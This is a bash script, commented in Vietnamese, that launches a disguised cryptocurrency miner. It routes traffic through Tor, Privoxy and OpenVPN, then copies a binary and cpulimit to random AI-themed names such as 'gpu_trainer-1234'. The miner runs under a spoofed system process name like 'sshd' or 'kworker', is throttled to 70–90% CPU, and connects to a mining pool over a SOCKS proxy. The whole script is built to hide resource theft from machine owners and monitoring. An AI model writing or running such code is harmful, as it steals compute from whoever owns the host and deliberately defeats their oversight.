#!/bin/bash

# Cấu hình DNS trước khi khởi động OpenVPN
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf

# Khởi động Tor, Privoxy và OpenVPN với các cấu hình tương ứng
sudo service tor restart
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
  exit 1
fi

sudo service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

sudo openvpn --config $VPN_CONFIG & 
sleep 5  # Đợi OpenVPN khởi động
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Tạo file model.txt nếu chưa tồn tại
if [ ! -f /root/model.txt ]; then
  touch /root/model.txt
fi

# Xóa tiến trình cũ nếu có
if [ -f /usr/sbin/$(cat /root/model.txt) ]; then
  echo "Removing old process: $(cat /root/model.txt)"
  rm -f /usr/sbin/$(cat /root/model.txt)
fi

# Danh sách các tên tiến trình hợp lệ
SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

# Chọn ngẫu nhiên một tên tiến trình hợp lệ
RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

# Danh sách các tên liên quan đến AI
AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")

# Chọn tên AI ngẫu nhiên
RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}

# Tạo số ngẫu nhiên
RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

# Tạo tên tiến trình cuối cùng
FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
echo $FINAL_NAME > /root/model.txt

# Copy file hệ thống đến tên mới
cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

# Xóa cpulimit cũ nếu tồn tại
if [ -f /usr/bin/$CPULIMIT_NAME ]; then
  echo "Removing old cpulimit: $CPULIMIT_NAME"
  rm -f /usr/bin/$CPULIMIT_NAME
fi

# Tạo tên mới cho cpulimit
CPULIMIT_NAME="${RANDOM_AI_NAME}_${RANDOM_NUMBER}"
cp /usr/bin/cpulimit /usr/bin/$CPULIMIT_NAME

# Tính toán số luồng dựa trên tỷ lệ CPU ngẫu nhiên
TOTAL_CORES=$(nproc)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

# Gán tiến trình vào các core CPU ngẫu nhiên
CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))

# Giới hạn mức tiêu thụ CPU từ 50% đến 90%
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
CPU_LIMIT_PERCENT=$(shuf -i 70-90 -n 1)
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))

# Khởi chạy tiến trình được đổi tên và sử dụng cpulimit với tên ngẫu nhiên
echo "Starting the process disguised as: $FINAL_NAME and cpulimit: $CPULIMIT_NAME (wrapped under the system process: $RANDOM_SYSTEM_PROCESS)"
sudo -u nobody /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks --name "$RANDOM_SYSTEM_PROCESS" /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050 &

# Giữ tiến trình chạy liên tục
tail -f /dev/null
